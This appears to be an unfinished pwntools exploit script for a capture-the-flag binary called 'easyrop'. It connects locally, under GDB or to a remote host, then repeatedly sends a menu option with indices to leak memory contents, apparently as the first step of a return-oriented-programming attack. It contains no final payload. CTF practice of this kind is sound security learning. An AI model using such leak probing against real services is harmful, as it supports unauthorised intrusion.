#!/usr/bin/env python3

from pwn import *

elf = ELF("./easyrop")
libc = elf.libc

context.binary = elf
context.log_level  = "info"

gdbscript='''
continue
'''
def conn(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([elf.path] + argv, *a, **kw)


def main():
    r = conn()
    
    r.recvuntil(b"read!\n")
    for i in range(0,300):
       if i % 3 != 0:
           r.sendline(b"2")
           r.sendlineafter(b"index: ",str(i).encode())
           print(r.recvline())
    
    pause()

    r.interactive()


if __name__ == "__main__":
    main()

